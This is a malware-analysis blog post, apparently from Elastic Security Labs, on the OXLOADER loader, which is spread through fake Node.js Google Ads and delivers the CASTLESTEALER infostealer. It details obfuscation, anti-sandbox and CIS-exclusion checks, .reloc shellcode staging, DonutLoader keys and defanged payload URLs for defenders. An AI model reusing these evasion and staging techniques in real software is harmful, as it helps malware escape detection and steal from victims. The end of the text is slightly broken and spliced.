Analysis","url":"/security-labs/threat-command/category/malware-analysis","locale":"en-us","created_by":"blt03b12f5a6591ef8c","updated_by":"blt03b12f5a6591ef8c","created_at":"2026-08-12T12:28:35.178Z","updated_at":"2026-08-14T14:34:54.590Z","ACL":{},"_version":2,"tags":[],"seo":{"canonical_tag":"","do_not_index":false,"nofollow":false,"seo_description_l10n":"","seo_image":null,"seo_title_l10n":""},"title_l10n":"Malware Analysis","publish_details":{"time":"2026-08-25T08:19:17.315Z","user":"blt03b12f5a6591ef8c","environment":"blt835e2c3b7e9eb7fb","locale":"en-us"}}],"created_at":"2026-08-12T15:25:20.252Z","created_by":"blt03b12f5a6591ef8c","date":"2026-06-19","main_content":{"markdown_l10n":"A previously undocumented Windows loader tracked as OXLOADER is delivering the CASTLESTEALER infostealer via malicious Google Ads, with low detection rates across static engines and sandbox detonations. The loader uses several obfuscation layers (control-flow flattening, opaque predicates, mixed Boolean-Arithmetic), self-modifying decryption stubs, and abuses the Windows `.reloc` section to stage shellcode.\n\nElastic Security Labs identified OXLOADER in an active campaign targeting one of our customers; CIS-region and Russian-language exclusions point to a financially motivated, Russian-speaking threat actor. We have found no prior public reporting on this family.\n\n## Key takeaways\n\n* Elastic Security Labs discovers new loader (OXLOADER)   \n* OXLOADER observed in campaigns distributing CASTLESTEALER via malicious Google Ads  \n* CIS-region exclusion and Russian language checks suggest a Russian-speaking, financially motivated threat actor  \n* Low detection rates across static engines and sandbox detonations  \n* Elastic Defend stops the entire attack chain using advanced prevention capabilities \n\n## How malvertising delivered OXLOADER to victims\n\nOXLOADER is distributed via malicious Google Ads impersonating Node.js. Victims are redirected through an intermediary domain to a Storj-hosted batch script, which downloads and executes OXLOADER.\n\nThe infection began when the user searched for an `lts version of node.js` and clicked a sponsored result leading to `node-js[.]prentiva99[.]info`, a [malicious landing page](https://gist.github.com/jiayuchann/fc37e3c047ebd987619e440c44b465ad) designed to impersonate a legitimate Node.js deployment platform. The threat actor operated a Google Ads campaign targeting US-based victims; the ad was last shown on Apr 23, 2026, and the site is now offline. The advertiser was registered under the verified name `ВОЛОДИМИР ТЕРЕЩЕНКО`, based in Ukraine. Whether this reflects the actual operator, a front account, or a purchased identity remains unclear. On May 14, 2026, the advertiser along with their associated ad campaigns were removed from Google entirely.\n\n![Advertiser’s profile on Google Ads Transparency Center](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltb9457e00822ba148/6a7c900ac33f4f63abd54ce8/image1.png \"Advertiser’s profile on Google Ads Transparency Center\")\n\nUpon interaction, the user was redirected through `app[.]miloyannopoulos[.]com/download?subid1=download`, which responded with a `302 Found` to the payload URL `link[.]storjshare[.]io/raw/jux4e4ky5mruo4jkxsssp42sau4q/ruslan/BATPackageBuilderSetup.bat`. This delivered a Windows batch script, hosted on [Storj’s](https://www.storj.io/) legitimate link-sharing service, which the threat actor abused to evade domain-based reputation filtering.\n\nThe batch script displays a fake software installation wizard UI, immediately downloads the next-stage executable from the Storj URL `link.storjshare[.]io/raw/jwwvr4oskkkjsgevt774ta62ehya/ruslan/aBsvwbdas.exe` via PowerShell, and launches it with `-Verb RunAs` to trigger a UAC elevation prompt.\n\n![Batch script downloading and launching OXLOADER](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt02635785a739f483/6a7c900d51156a6b702bcb85/image11.png \"Batch script downloading and launching OXLOADER\")\n\nFollowing execution of the Batch script, Elastic Defend detected malicious behavior (policy was set to detect only), triggering multiple behavioral rules including `Microsoft Common Language Runtime Loaded from Suspicious Memory`, hinting at a .NET-based payload consistent with `CASTLESTEALER`.\n\n![Elastic Defend alerts triggered upon script execution](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltcfeb0e316954ce78/6a7c900ffc63ab174c647207/image26.png \"Elastic Defend alerts triggered upon script execution\")\n\nThe following is the execution graph of the attack chain from payload download to `CASTLESTEALER` deployment.\n\n![Infection chain](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt03dadf42593a090e/6a7c901233fa8a72511fcbfa/image4.png \"Infection chain\")\n\n## OXLOADER malware loader: technical analysis\n\nThe first OXLOADER sample our team analyzed masquerades as the popular tool, [API Monitor](http://www.rohitab.com/apimonitor) from [rohitab.com](http://rohitab.com). Due to the heavy presence of legitimate code and code-hiding techniques, this loader is able to fly under the radar against static file analyzers.\n\n![VirusTotal showing small number of detections](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt8e03157e19d96082/6a7c9015e88c652c0a005ad1/image23.png \"VirusTotal showing small number of detections\")\n\n## How OXLOADER unpacks itself at runtime\n\nThe malware begins executing during the CRT initializer phase, before any user code is run. The CRT function `cinit()` invokes `initterm()`, which walks the C++ initializer table (`__xc_a` → `__xc_z`) calling each entry. The malware developer has hijacked one of these entries, pointing to a function that makes a `RegisterClipboardFormatW()` call before tail-jumping into the first decryption stub.\n\n![Malicious code started through CRT initialization](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt82520a68c7661ff2/6a7c901880ee38f68f60d397/image25.png \"Malicious code started through CRT initialization\")\n\nThe loader uses self-modifying techniques with several decryption stubs to unroll itself. Below is an example of a decryption stub being patched in during runtime, before jumping to it.\n\n![Small decryption stub patched in](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt629389e81507b989/6a7c901bc2cc096454243634/image2.png \"Small decryption stub patched in\")\n\nAfter the patching has taken place, the loader decrypts a 28,233-byte region. Each byte is decrypted with a single-byte XOR key that updates after every iteration: the just-decrypted plaintext byte is added to the key, which is then used to decrypt the next byte. This similar decryption routine runs three times in total, each over a different region.\n\n![Rolling-XOR decryption of next-stage code](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt0e305ef5792d9744/6a7c901e437e0f8dbadd5865/image28.png \"Rolling-XOR decryption of next-stage code\")\n\n## Obfuscation techniques used to evade static detection\n\nOXLOADER breaks automated function-boundary detection in binary analysis tooling such as IDA Pro using four layered obfuscation techniques: control-flow flattening (CFF), mixed Boolean-Arithmetic (MBA), opaque predicates, and function chunking across non-contiguous code regions. Functions are stitched together with unconditional jumps, and some regions are reached through indirect jumps whose target addresses are computed at runtime via MBA arithmetic. The result is that IDA Pro cannot reliably reconstruct function boundaries, requiring manual fixes.\n\n![Control-flow flattening with nested MBA arithmetic example](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc414e4aa82e4917a/6a7c9021fc63ab606564720b/image17.png \"Control-flow flattening with nested MBA arithmetic example\")\n\nThe loader decrypts various strings at runtime using the following string decryption algorithm:\n\n```cpp\nuint32_t obf_xor_a1_with_a2_plus_33FDA(uint32_t a1, uint32_t a2) { \nreturn a1 ^ (a2 + 0x33FDA); \n} \n```\n\nAfter the code is fully unpacked/decrypted, the malware combines this string decryption function with an Adler-32 API hashing [algorithm](https://github.com/OALabs/hashdb/blob/main/algorithms/dualacc_modfff1.py) to dynamically resolve its imports. \n\n![String decryption and API resolving](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt1e02ca032337bba1/6a7c9024448e4e4d825bae17/image13.png \"String decryption and API resolving\")\n\n## How does OXLOADER evade sandbox and VM detection?\n\nAfter resolving its APIs, OXLOADER performs various checks to ensure the machine executes in a clean environment, avoiding execution in sandbox environments.\n\n| Check | Method | Threshold |\n| :---- | :---- | :---- |\n| Emulation | `WNetAddConnection2W` with malformed resource | Expects `ERROR_BAD_NAME` (0x43) |\n| CPU count | Process environment check | ≥ 3 CPUs |\n| RAM | `GlobalMemoryStatusEx` | ≥ 3 GB physical memory |\n| Display refresh rate | WMI `Win32_VideoController` query | ≥ 20 Hz |\n| Geographic region | `GetUserGeoID` | Excludes CIS GEOIDs |\n\nThe first check attempts to connect to a deliberately malformed network resource (`*72s@1s`) using `mpr!WNetAddConnection2W`. This technique appears to defeat emulation/sandboxes that may hook or return a successful connection unconditionally. The malware developer verifies this call by accessing the TEB directly to retrieve the `LastErrorValue`. The loader expects this error code to be `ERROR_BAD_NAME (0x43)`, if the error code is anything other than this value, the malware takes the failure branch and stops execution.\n\n![Emulation check via WNetAddConnection2W](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf2ea56786e1b957b/6a7c902633fa8a64d41fcc02/image20.png \"Emulation check via WNetAddConnection2W\")\n\nThe second check is an anti-sandbox test based on the processor count: the loader requires the host to have at least 3 CPUs to continue. Many sandboxes and analysis VMs are provisioned with one or two CPUs to conserve resources, so this threshold filters out these automated analysis environments.\n\n![Anti-sandbox check using CPU count](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt7febea531474e4d9/6a7c9029da3d0550b1633fdd/image15.png \"Anti-sandbox check using CPU count\")\n\nThe next check uses `GlobalMemoryStatusEx()` to verify that the host has at least 3 GB of available physical memory.\n\n![Anti-sandbox check based on RAM](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt433d8d647bd87e2d/6a7c902c3ce8e2803ecef9a5/image6.png \"Anti-sandbox check based on RAM\")\n\nA further check uses WMI to query the system display's refresh rate, executing the WQL statement `SELECT CurrentRefreshRate FROM Win32_VideoController` and comparing the returned value (in Hertz) against a threshold of 20\\. Physical monitors usually report around 60 Hz or higher, while headless and default-virtualized configurations typically report 0 or 1, and values below 20 cause the loader to abort.\n\n![Anti-sandbox check based on refresh rate](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt24e0deb9f4262c1d/6a7c902f1967eac09832aac7/image24.png \"Anti-sandbox check based on refresh rate\")\n\n## Geographic and language exclusions\n\nThe final two checks halt execution if the host is located in a [CIS](https://en.wikipedia.org/wiki/Commonwealth_of_Independent_States) country or configured for the Russian language. The first check in this category uses `GetUserGeoID` to retrieve the system’s geographic region and compares it against a hardcoded list of CIS country GEOIDs.\n\n![CIS country exclusion list](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt23404cddac024b49/6a7c9032c2cc096a2324363a/image29.png \"CIS country exclusion list\")\n\nThe second check uses `GetUserDefaultUILanguage` and matches against LANGID (`0x419 - Russian, Russia`), the standard configuration for a Russian language Windows installation. \n\n![Russian language exclusion](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc2444409e97e991d/6a7c903473d9bdd3bb297e8e/image7.png \"Russian language exclusion\")\n\n## Shellcode staging via .reloc section and OCX file\n\nAfter all the checks have passed, the malware makes a copy of the Windows DirectUI Engine DLL (`C:\\Windows\\System32\\dui70.dll`), storing it in a temporary location using a randomly generated name with the `.ocx` extension (`PFHemkxVk.ocx`). This extension choice inspired the OXLOADER family name.\n\n![Newly dropped DLL copied from dui70.dll](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltcb2d047fcc292353/6a7c9037bd2198731c752507/image21.png \"Newly dropped DLL copied from dui70.dll\")\n\nOXLOADER then creates a new section named (`.xtext`) in this target DLL (`PFHemkxVk.ocx`).\n\n![New section highlighted via PE Bear](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltbf0e07962525e80e/6a7c903a448e4eddb95bae21/image14.png \"New section highlighted via PE Bear\")\n\nThis new section (`.xtext`) is configured with RWX (read/write/execute) protections in preparation to store and execute the next stage of the malicious code.\n\n![PE Bear showing newly added section with characteristics](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blta5192c0dc5335b78/6a7c903db43770dd694d128e/image5.png \"PE Bear showing newly added section with characteristics\")\n\nThis updated DLL (`PFHemkxVk.ocx`) is then loaded into the existing loader process via `LoadLibraryA`.\n\n![Process Hacker showing new loaded module](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt2404a6f493972e34/6a7c90417cfd7a7e62314f95/image12.png \"Process Hacker showing new loaded module\")\n\nIn a normal Windows executable, the `.reloc` section contains a table of `IMAGE_BASE_RELOCATION` blocks that the Windows loader applies to patch absolute addresses when the image is loaded at an address other than its preferred base. In this sample, the malware developer is using   \nthe `.reloc` section to house malicious code instead of the base relocation entries. This is a strong static-analysis red flag: legitimate toolchains do not emit code into the `.reloc` section.\n\n![PE-bear showing code/instructions inside .reloc section](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt595f1636c7d0a9b9/6a7c9044bdcff04752c3d320/image3.png \"PE-bear showing code/instructions inside .reloc section\")\n\nThis shellcode from the `.reloc` section is then copied to the newly created section (`.xtext`) in the OCX file, and the loader then calls this code.\n\n![Shellcode copied from .reloc section](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltae363ccd78b00081/6a7c90477cfd7a290c314f99/image19.png \"Shellcode copied from .reloc section\")\n\nAs observed previously, there is another decryption stub used to unpack this next stage.  \n   \n![Self-modifying instructions from .xtext section](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt9711b1a5371ff842/6a7c9049ead8ecd009ba4bb4/image10.png \"Self-modifying instructions from .xtext section\")\n\n## In-memory infostealer delivery via DonutLoader and .NET assembly\n\nThis next-stage shellcode is a payload configured from [DonutLoader](https://github.com/TheWover/donut), an open-source shellcode generator used to wrap .NET assemblies, DLLs, and EXEs into position-independent shellcode (PIC) for in-memory execution. During unpacking, the shellcode decrypts the loader's embedded configuration and execution context using the Chaskey-LTS block cipher in CTR mode with the key (`6E0A1F8F77F7011561F6F9CA96B71B8F`) and IV (`956C6128E9362E075F8D006C93616A66`).\n\n![DonutLoader shellcode after decryption](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltf982a02649ae09b8/6a7c904c6c6eac6a55f0e61f/image8.png \"DonutLoader shellcode after decryption\")\n\nAfter the decryption, the payload is decompressed via aPLib then bootstrapped through DonutLoader’s `RunPE()` [function](https://github.com/TheWover/donut/blob/47758d787209dd1744f58c140102ac91b649df16/loader/inmem_pe.c#L57). The final payload is a newly discovered information stealer by [Huntress](https://www.huntress.com/blog/clickfix-castleloader-backgroundfix) called CASTLESTEALER. This attribution is based on the same AES key used for C2 communications found between `0xDEADBEEF` markers in a previous [sample](https://www.virustotal.com/gui/file/ed391a16389234f9ebb6727711baaf3e068d7f77c465708fa3e8b7d0565d7fb9).\n\n![Same AES key used in CASTLESTEALER sample](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt032a25e20c1ccd5b/6a7c904f6c6eacc56df0e623/image16.png \"Same AES key used in CASTLESTEALER sample\")\n\n## Second OXLOADER variant: same loader, different masqueraded program\n\nA second OXLOADER variant masquerades as a Node.js installer rather than API Monitor, but uses the identical loader mechanism.\n\nOn May 13, 2026, we discovered that the redirector endpoint `app.miloyannopoulos[.]com/download` responded with one of two `Location` header fields, chosen at random:\n\n* `https://link.storjshare[.]io/raw/jv5uebuqwzfpmtahj34q753ptykq/node/BATPackageBulderSetup.bat`  \n* `https://link.storjshare[.]io/raw/jvsmdybqmvwep2oawbobp6ub7aza/node/node-v24.15.0-x64-86.exe`\n\nThe Batch installation script (`BATPackageBulderSetup.bat`, with a typo for “Builder”) remained mostly identical. The only difference was that the Storj payload link now pointed to a different binary named `node-v24.15.0-x64-86.exe`.\n\n![Batch script with a different embedded link pointing to OXLOADER](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltac88cb5f233a7c19/6a7c9052e88c65a3b8005adf/image9.png \"Batch script with a different embedded link pointing to OXLOADER\")\n\nThe payload attempts to masquerade itself as benign CMake code while retaining “node” in the filename, likely to keep the lure theme intact. We believe the earlier “API Monitor” sample was likely a distribution error by the operator.\n\n![VirusTotal with small amounts of detection](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt2f6f62508bd4846d/6a7c90556c6eac7070f0e627/image22.png \"VirusTotal with small amounts of detection\")\n\nUpon execution, we noticed the same pattern: indirect jumps used for in-memory self-decryption, followed by the loading of `mpr.dll` and a call to `WNetAddConnection2W`. We confirmed that it is the identical loader mechanism discussed previously, and this sample also loads `CASTLESTEALER`.\n\n![Loader behavior caught through a TinyTracer run](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt1ba36cb95fa08701/6a7c9058fc63ab3506647217/image27.png \"Loader behavior caught through a TinyTracer run\")\n\nBelow is a snippet where the self-decryption occurs. Dummy CMake-related strings appear to be passed as arguments to a function call, which patches a small decryption stub into memory immediately after the call site. Execution then jumps to the stub to decrypt subsequent instructions, and this process repeats 2 more times until the main malware body is decrypted.\n\n![Identical self-decryption mechanism as the first sample](https://images.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt909d9296c7dbf3a3/6a7c905b2f00b2eff6ef9109/image18.png \"Identical self-decryption mechanism as the first sample\")\n\n## Conclusion: why defenders should track OXLOADER\n\nOXLOADER is in an early operational phase, but the engineering behind it suggests this family is worth watching. The code obfuscation, anti-VM measures, benign-looking code used to masquerade its binaries, and unique staging techniques reflect deliberate engineering choices to evade analysis. That investment is paying off, resulting in low detection rates across static engines and detonation runs, giving OXLOADER a window to operate before it gets hunted down.\n\n## REF8372 through MITRE ATT\\\u0026CK\n\nElastic uses the [MITRE ATT\\\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that threats use against enterprise networks.\n\n### Tactics\n\nTactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.\n\n* [Resource Development](https://attack.mitre.org/tactics/TA0042)  \n* [Initial Access](https://attack.mitre.org/tactics/TA0001)  \n* [Execution](https://attack.mitre.org/tactics/TA0002)  \n* [Defense Evasion](https://attack.mitre.org/tactics/TA0005)  \n* [Exfiltration](https://attack.mitre.org/tactics/TA0010)\n\n### Techniques\n\nTechniques represent how an adversary achieves a tactical goal by performing an action.\n\n* [Acquire Infrastructure: Malvertising](https://attack.mitre.org/techniques/T1583/008/)  \n* [Stage Capabilities: Upload Malware](https://attack.mitre.org/techniques/T1608/001/)  \n* [User Execution: Malicious Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)  \n* [Obfuscated Files or Information: Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013/)  \n* Discovery](https://attack.mitre.org/techniques/T1614/001/)  \n* [Reflective Code Loading](https://attack.mitre.org/techniques/T1620/)\n\n## Remediating REF8372\n\n### Prevention\n\n* [Potential this research.\n\n| Observable | Type | Name | Reference |\n| :---- | :---- | :---- | :---- |\n| `node-js\\[.\\]prentiva99\\[.\\]info` | domain-name |  | Malvertising landing page |\n|
